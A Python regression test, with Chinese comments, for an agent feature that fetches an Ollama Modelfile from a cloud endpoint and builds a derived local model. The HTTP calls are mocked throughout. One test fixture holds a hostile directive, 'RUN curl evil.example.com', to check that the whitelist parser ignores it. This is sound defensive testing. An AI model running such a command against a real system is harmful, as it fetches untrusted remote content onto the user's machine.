"""
test_phase15_p2_evolve.py —— 阶段十五 P2「云端黄金记忆 ⇒ 本机一键合成进化模型」回归自检

背景
----
阶段十五的终极闭环是：**云端策展黄金记忆 ⇒ 算力主本机烘焙进化模型**。

- 云端：公开只读端点 ``GET /api/v1/network/golden-modelfile`` 下发一段
  **标准 Ollama Modelfile**（``FROM`` / ``PARAMETER`` / ``SYSTEM`` / ``MESSAGE``）；
- 本机：Agent 的 ``POST /api/ollama/evolve`` 拉这段 Modelfile，交给本机
  Ollama 的 ``POST /api/create`` 合成一个派生模型，**零训练成本、零显卡**。

本文件锁死七条不变量：

- **P1** Modelfile 解析：只认白名单指令（``FROM``/``PARAMETER``/``SYSTEM``/``MESSAGE``）；
  远端文本里的 ``RUN`` / ``ADAPTER`` 之类**一律忽略**（本机不被远端文本诱导）；
- **P2** 进化模型名推导：``qwen2.5:0.5b`` → ``qwen2.5-apipaw-golden:latest``；
- **P3** ``POST /api/ollama/evolve`` 成功路径：拉云端 Modelfile → 调本机
  ``/api/create`` → 回显黄金范例条数；
- **P4** 本机 Ollama **没起来** ⇒ 回 ``200 + ok:false`` + 人话提示（**不是 500**）；
- **P5** ``bind=true`` ⇒ 合成后把新模型写进 ``backend_model`` + ``model_name``
  （``model_name`` 不改的话云端匹配不上这个节点 ⇒ 永远派不到单）；
- **P6** 云端不可达 ⇒ 明确报错，**不**改配置；
- **P7** 全程**绝不触碰真机 ``agent.config.json``**（用临时目录配置 + 前后字节比对）。

⚠️ 本机 Ollama 与云端全部用**假 urlopen** 替换 —— 不下载任何东西、不连任何真实端口。
"""

from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[0]
sys.path.insert(0, str(REPO_ROOT))

import agent_config  # noqa: E402
import main as agent_main  # noqa: E402
import ollama_local  # noqa: E402

_PASS = 0
_FAIL = 0

CLOUD_MODELFILE = """# APIPaw 进化版模型 · Modelfile（自动生成）
FROM qwen2.5:0.5b

PARAMETER temperature 0.7
PARAMETER top_p 0.9
PARAMETER num_ctx 8192
PARAMETER repeat_penalty 1.1

SYSTEM \"\"\"你是 APIPaw 算力网络上的严谨助手。
以下是被采纳的高质量范例：\"\"\"

MESSAGE user \"\"\"APIPaw 的场景 B 版税率是多少？\"\"\"
MESSAGE assistant \"\"\"场景 B（社区创作者模型）默认版税率是 0.15。\"\"\"
"""

CLOUD_SUMMARY = {
    "status": "success",
    "golden_count": 2,
    "pool_total": 5,
    "latest": [
        {"request_id": "curated:abc", "model_id": "qwen2.5:0.5b",
         "created_at": 1.0, "prompt_preview": "APIPaw 的场景 B 版税率是多少？"},
    ],
}

#: 被假 urlopen 记录下来的本机 ``/api/create`` 请求体（用来断言真的下发了范例）
CREATE_PAYLOADS = []


def _record(name: str, ok: bool, detail: str = "") -> None:
    global _PASS, _FAIL
    if ok:
        _PASS += 1
        print("[PASS] %s | %s" % (name, detail))
    else:
        _FAIL += 1
        print("[FAIL] %s | %s" % (name, detail))


class _FakeResp:
    def __init__(self, payload: bytes = b"") -> None:
        self._payload = payload

    def __enter__(self) -> "_FakeResp":
        return self

    def __exit__(self, *exc: object) -> bool:
        return False

    def read(self) -> bytes:
        return self._payload


def _fake_urlopen(req, timeout=None):
    url = getattr(req, "full_url", "") or getattr(req, "url", "")
    if "/api/create" in url:
        body = req.data.decode("utf-8") if req.data else "{}"
        CREATE_PAYLOADS.append(json.loads(body))
        return _FakeResp(payload=json.dumps({"status": "success"}).encode("utf-8"))
    if "/api/v1/network/golden-modelfile" in url:
        return _FakeResp(payload=CLOUD_MODELFILE.encode("utf-8"))
    if "/api/v1/network/golden-summary" in url:
        return _FakeResp(payload=json.dumps(CLOUD_SUMMARY).encode("utf-8"))
    raise AssertionError("测试里出现了意料之外的 URL: %s" % url)


def main() -> int:
    from starlette.testclient import TestClient  # noqa: E402

    tmp_dir = tempfile.mkdtemp(prefix="apipaw_p15_p2_")
    path = Path(tmp_dir) / "agent.config.json"
    cfg = agent_config.AgentConfig(config_path=path)

    agent_config._config_instance = cfg  # type: ignore[attr-defined]
    agent_main.get_config = lambda: cfg  # type: ignore[assignment]
    cfg.update(cloud_api_base="https://cloud.example.com",
               backend_base_url="http://127.0.0.1:11434",
               backend_model="qwen2.5:0.5b")

    real_cfg = REPO_ROOT / "agent.config.json"
    before = real_cfg.read_bytes() if real_cfg.exists() else b""

    # ── P1：Modelfile 解析（白名单指令）──
    parsed = ollama_local.parse_modelfile(CLOUD_MODELFILE)
    _record(
        "P1 Modelfile 解析出 FROM / PARAMETER / SYSTEM / MESSAGE",
        parsed.get("from") == "qwen2.5:0.5b"
        and parsed.get("parameters", {}).get("temperature") == 0.7
        and "严谨助手" in (parsed.get("system") or "")
        and len(parsed.get("messages") or []) == 2,
        "from=%r params=%r messages=%d"
        % (parsed.get("from"), parsed.get("parameters"),
           len(parsed.get("messages") or [])),
    )
    hostile = ollama_local.parse_modelfile(
        "FROM qwen2.5:0.5b\nRUN curl evil.example.com\nADAPTER /tmp/x\n"
        "SYSTEM \"\"\"ok\"\"\"\n")
    _record(
        "P1 远端文本里的 RUN / ADAPTER 指令被忽略",
        hostile.get("from") == "qwen2.5:0.5b"
        and hostile.get("system") == "ok"
        and not hostile.get("messages"),
        "parsed=%r" % (hostile,),
    )
    _record(
        "P1 缺 FROM 行的 Modelfile 被拒绝合成",
        ollama_local.create_model_from_modelfile(
            "http://127.0.0.1:11434", "x:latest", "SYSTEM \"\"\"hi\"\"\""
        ).get("ok") is False,
        "",
    )

    # ── P2：进化模型名推导 ──
    names = {
        "qwen2.5:0.5b": "qwen2.5-apipaw-golden:latest",
        "library/llama3:8b": "llama3-apipaw-golden:latest",
        "": "qwen2.5-apipaw-golden:latest",
    }
    derived_ok = all(
        ollama_local.derive_evolved_model_name(k) == v for k, v in names.items())
    _record("P2 进化模型名推导规则正确", derived_ok,
            "derived=%r" % {k: ollama_local.derive_evolved_model_name(k)
                            for k in names})

    app = agent_main.create_app()
    # ⚠️ **不进 lifespan**（会启动 WS 隧道 + 遥测 ⇒ 真的连生产云端）
    client = TestClient(app)

    with mock.patch("urllib.request.urlopen", side_effect=_fake_urlopen):
        # ── P3：成功路径 ──
        del CREATE_PAYLOADS[:]
        res = client.post("/api/ollama/evolve", json={"base_model": "qwen2.5:0.5b"})
        body = res.json()
        _record(
            "P3 POST /api/ollama/evolve 合成成功",
            res.status_code == 200 and body.get("ok") is True
            and body.get("evolved") is True
            and body.get("name") == "qwen2.5-apipaw-golden:latest",
            "HTTP %s body=%s" % (res.status_code, res.text),
        )
        _record(
            "P3 本机 /api/create 收到了 from + system + messages",
            len(CREATE_PAYLOADS) == 1
            and CREATE_PAYLOADS[0].get("from") == "qwen2.5:0.5b"
            and len(CREATE_PAYLOADS[0].get("messages") or []) == 2
            and "严谨助手" in (CREATE_PAYLOADS[0].get("system") or ""),
            "payload=%r" % (CREATE_PAYLOADS[0] if CREATE_PAYLOADS else None,),
        )
        _record(
            "P3 回显了云端黄金条数与本地范例条数",
            int(body.get("golden_count") or 0) == 2
            and int(body.get("few_shot_messages") or 0) == 2,
            "golden_count=%r few_shot=%r"
            % (body.get("golden_count"), body.get("few_shot_messages")),
        )

        # ── P5：bind=true ⇒ 写盘 ──
        bound = client.post("/api/ollama/evolve",
                            json={"base_model": "qwen2.5:0.5b", "bind": True})
        bound_body = bound.json()
        saved = json.loads(path.read_text(encoding="utf-8"))
        _record(
            "P5 bind=true ⇒ backend_model / model_name 都写盘",
            bound_body.get("bound") is True
            and saved.get("backend_model") == "qwen2.5-apipaw-golden:latest"
            and saved.get("model_name") == "qwen2.5-apipaw-golden:latest",
            "saved.backend_model=%r saved.model_name=%r"
            % (saved.get("backend_model"), saved.get("model_name")),
        )

        # ── P6：云端不可达 ⇒ 明确报错，不改配置 ──
        saved_before = path.read_bytes()
        with mock.patch("urllib.request.urlopen",
                        side_effect=OSError("connection refused")):
            down = client.post("/api/ollama/evolve", json={})
        _record(
            "P6 云端不可达 ⇒ ok=false + 人话提示 + 不改配置",
            down.status_code == 200 and down.json().get("ok") is False
            and bool(down.json().get("message"))
            and path.read_bytes() == saved_before,
            "HTTP %s body=%s" % (down.status_code, down.text),
        )

    # ── P4：本机 Ollama 没起来 ⇒ 200 + ok=false + 人话 ──
    def _only_cloud(req, timeout=None):
        url = getattr(req, "full_url", "") or getattr(req, "url", "")
        if "/api/v1/network/golden-modelfile" in url:
            return _FakeResp(payload=CLOUD_MODELFILE.encode("utf-8"))
        if "/api/v1/network/golden-summary" in url:
            return _FakeResp(payload=json.dumps(CLOUD_SUMMARY).encode("utf-8"))
        raise OSError("connection refused")

    with mock.patch("urllib.request.urlopen", side_effect=_only_cloud):
        no_ollama = client.post("/api/ollama/evolve", json={})
    body = no_ollama.json()
    _record(
        "P4 本机 Ollama 没起来 ⇒ 200 + ok=false + 明确提示（不是 500）",
        no_ollama.status_code == 200 and body.get("ok") is False
        and "Ollama" in str(body.get("message") or ""),
        "HTTP %s body=%s" % (no_ollama.status_code, no_ollama.text),
    )

    # ── 面板卡片存在（阶段十五 P2 的 UI 入口）──
    html = agent_main.UI_HTML
    _record(
        "面板有「云端黄金记忆本地模型进化」卡片与按钮",
        "云端黄金记忆本地模型进化" in html
        and 'id="evolveBtn"' in html
        and "/api/ollama/evolve" in html,
        "",
    )

    # ── P7：真机 agent.config.json 分毫未动 ──
    after = real_cfg.read_bytes() if real_cfg.exists() else b""
    _record(
        "P7 真机 agent.config.json 全程未被触碰",
        before == after,
        "before=%d bytes after=%d bytes" % (len(before), len(after)),
    )

    print("")
    print(
        "===== 阶段十五 P2 · Agent 云端黄金记忆本地模型进化（沙箱）：%d/%d 通过 ====="
        % (_PASS, _PASS + _FAIL)
    )
    return 0 if _FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
